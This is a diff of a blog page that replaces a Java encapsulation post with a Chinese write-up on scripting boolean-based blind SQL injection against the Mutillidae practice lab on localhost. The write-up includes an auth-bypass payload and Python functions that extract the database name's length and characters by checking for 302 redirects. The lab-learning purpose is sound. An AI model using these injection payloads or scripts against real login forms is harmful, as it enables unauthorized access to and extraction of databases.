@@ -9,7 +9,7 @@
     
     <title>
         
-            OOP封装 |
+            SQL盲注脚本 |
         
         Keep )w(
     </title>
@@ -177,7 +177,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">OOP封装</span>
+            <span class="title-hover-animation">SQL盲注脚本</span>
         </div>
 
         
@@ -195,7 +195,7 @@
                     <div class="meta-info">
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2021-03-30 13:04:57
+        <i class="fas fa-edit"></i>&nbsp;2021-07-21 19:18:52
     </span>
     
         <span class="article-categories article-meta-item">
@@ -203,12 +203,23 @@
             <ul>
                 
                     <li>
-                        <a href="/categories/JAVA/">JAVA</a>&nbsp;
+                        <a href="/categories/web/">web</a>&nbsp;
                     </li>
                 
             </ul>
         </span>
     
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/python%E8%84%9A%E6%9C%AC/">python脚本</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
     
 
     
@@ -223,17 +234,34 @@
         
 
         <div class="article-content markdown-body">
-            <h1 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(age &gt; <span class="number">100</span> || age &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.age = <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+            <h1 id="get-database-name"><a href="#get-database-name" class="headerlink" title="get_database_name"></a>get_database_name</h1><p>今天写了<code>SQL</code>盲注中的脚本，复盘一下。</p>
+<p>首先我们启动靶场，这里我用的是’mutillidae’，git地址：”<a class="link"   target="_blank" rel="noopener" href="https://github.com/webpwnized/mutillidae.git&quot;%E3%80%82" >https://github.com/webpwnized/mutillidae.git&quot;。<i class="fas fa-external-link-alt"></i></a></p>
+<p>我们进入sql盲注的登录页面</p>
+<img src="/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/Snipaste_2021-07-21_19-47-56.png" class="">
 
-<p>get和set这就是OOP封装。OOP封装有很大的优点，此时的age是一个只读域，很好的保护了数据的安全，虽然可以用set来修改他的值，但是我们可以在set里设置判断是否合法的条件。</p>
-<h1 id="好用的工具"><a href="#好用的工具" class="headerlink" title="好用的工具"></a>好用的工具</h1><p>虽然OOP封装有很多优点，但是如果在开发过程中有很多需要封装的实例域，这就会极大地降低效率。在IDEA中我推荐使用lombok。</p>
-<p>首先我们需要安装lombpk插件。</p>
-<img src="/2021/03/30/OOP%E5%B0%81%E8%A3%85/0.png" class="">
+<p>我们先随便输个值，用burpsuite抓个包，发现返回值是200。</p>
+<img src="/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/Snipaste_2021-07-21_19-49-28.png" class="">
 
-<p>接着我们在maven库中下载我们所需的架包。</p>
-<img src="/2021/03/30/OOP%E5%B0%81%E8%A3%85/1.png" class="">
+<img src="/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/Snipaste_2021-07-21_19-50-52.png" class="">
 
-<img src="/2021/03/30/OOP%E5%B0%81%E8%A3%85/3.png" class="2.png%｝ 最后将架包引入IDEA中。 {%asset_img">
+<p>接着我们用一个常见的绕过方法试一下，输入<code>&#39; or 1=1 #&#39;</code>发现返回值是302。</p>
+<img src="/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/Snipaste_2021-07-21_19-52-37.png" class="">
+
+<p>我们把<code>request</code>复制到我们的脚本中，提取当中的有用信息。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/index.php?page=login.php&#x27;</span></span><br><span class="line">heads = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://localhost/index.php?page=login.php&amp;popUpNotificationCode=LOU1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="comment">#&#x27;Content-Length&#x27;: &#x27;65&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=spcv5ud00rp549tfso3ora9ej2; showhints=1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;adminpass&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;login-php-submit-button&#x27;</span>: <span class="string">&#x27;Login&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="get-database-len"><a href="#get-database-len" class="headerlink" title="get_database_len"></a>get_database_len</h2><p>要想得到数据库的名字第一步就是要得到数据库的长度。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_len</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        database_L = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#x27; or length(database())= &quot;</span>+ <span class="built_in">str</span>(i) +<span class="string">&quot; #&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;adminpass&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;login-php-submit-button&#x27;</span>: <span class="string">&#x27;Login&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r_database_len = requests.post(url=url, headers=heads, data=database_L, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r_database_len.status_code == <span class="number">302</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure>
+
+<p>函数很简单，但是这里务必要有<code>allow_redirects=False</code>。</p>
+<h2 id="get-database-name-1"><a href="#get-database-name-1" class="headerlink" title="get_database_name"></a>get_database_name</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_name</span>(<span class="params">length = <span class="number">10</span></span>):</span></span><br><span class="line">    database_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;qwetyuioplkjhgfdsazxcvbnm0123456789&#x27;</span>:</span><br><span class="line">            username = <span class="string">&quot; &#x27; or left(database(), &quot;</span> + <span class="built_in">str</span>(i) +  <span class="string">&quot;) = &#x27;&quot;</span>  + database_name + <span class="built_in">str</span>(j) + <span class="string">&quot;&#x27; # &quot;</span></span><br><span class="line">            <span class="comment">#print(username)</span></span><br><span class="line">            data_database_name = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;login-php-submit-button&#x27;</span>: <span class="string">&#x27;Login&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r_database_name = requests.post(url=url, headers=heads, data=data_database_name, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> r_database_name.status_code == <span class="number">302</span>:</span><br><span class="line">                database_name += <span class="built_in">str</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> database_name</span><br></pre></td></tr></table></figure>
+
+<p>这里我主要用了mysql中的<code>left()</code>函数（从字符串左边开始截取）和判断的字符串<code>&#39;qwetyuioplkjhgfdsazxcvbnm0123456789&#39;</code>（当然还有其他更好的方法，但是博主能力有限。。。），总之我们再改一下<code>data</code>数据，大功告成。</p>
+<p>运行效果：</p>
+<img src="/2021/07/21/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/Snipaste_2021-07-21_20-40-17.png" class="">
+
         </div>
 
         
@@ -241,29 +269,14 @@
         
             <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2021/03/31/OOP%E7%BB%A7%E6%89%BF/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">OOP继承</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2021/03/24/JAVA%E4%B8%AD%E7%9A%84static/"
+                           href="/2021/07/20/Python%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">JAVA中的static</span>
+                                <span class="post-nav-title-item">Python数据结构</span>
                                 <span class="post-nav-item">下一篇</span>
                             </span>
                             <span class="right arrow-icon flex-center">
@@ -372,7 +385,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%81%E8%A3%85"><span class="nav-number">1.</span> <span class="nav-text">封装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A5%BD%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="nav-number">2.</span> <span class="nav-text">好用的工具</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#get-database-name"><span class="nav-number">1.</span> <span class="nav-text">get_database_name</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#get-database-len"><span class="nav-number">1.1.</span> <span class="nav-text">get_database_len</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-database-name-1"><span class="nav-number">1.2.</span> <span class="nav-text">get_database_name</span></a></li></ol></li></ol>
     </div>
 </div>
         </aside>
